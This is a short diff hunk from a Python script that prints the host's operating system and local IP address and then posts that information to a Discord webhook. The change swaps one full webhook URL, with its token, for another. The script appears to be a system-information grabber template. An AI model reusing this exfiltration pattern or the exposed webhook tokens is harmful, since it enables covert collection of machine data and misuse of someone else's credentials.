@@ -52,7 +52,7 @@ print(f"Operating System: {os_info}")
 print(f"Local IP Address: {local_ip}")
 
 # YOUR DISCORD WEBHOOK
-discord_webhook = "https://discord.com/api/webhooks/1297311442168709182/zLBpB8BCnCupKvon4kBr7_LknxdxJhwifMkxZe1hJpiVQepb0pSzh5I5USGNrG2R9qOP"
+discord_webhook = "https://discord.com/api/webhooks/1297528862510678047/_dnVUmiSsddL6AUpFMMvht-TgFCpAEeDe-vQwgOyUHFmeZwPIqGu5UCncwxmA9kGPzyC"
 
 # Send the system information to Discord
 data = {
